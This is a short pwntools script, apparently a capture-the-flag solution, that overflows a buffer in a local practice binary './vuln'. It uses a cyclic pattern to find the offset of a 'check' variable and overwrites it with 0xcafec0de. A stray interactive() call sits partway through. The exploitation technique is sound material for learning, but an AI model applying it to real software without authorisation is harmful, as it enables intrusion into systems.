#!/usr/bin/python3
from pwn import *
# printf("Check var overwritten with %#x bravo, almost done\n", check);

context.binary = elf = ELF('./vuln', checksec=False)

io = elf.process()

# 0x400 = 1024
payload = cyclic(0x400)
io.sendlineafter(b':)\n', payload)
# the interface receives the first part of the printf output and stops there:
io.recvuntil(b'with ')

# this isolate the number:
number = int(io.recvuntil(b' ').strip().decode(), 16) 
io.interactive()
pos = cyclic_find(number)

# we found the position of the number, so we start a new process to change it with cafec0de:
io = elf.process()

io.sendlineafter(b':)\n', flat({pos: 0xcafec0de}))

io.recvline()

print(io.recvall())
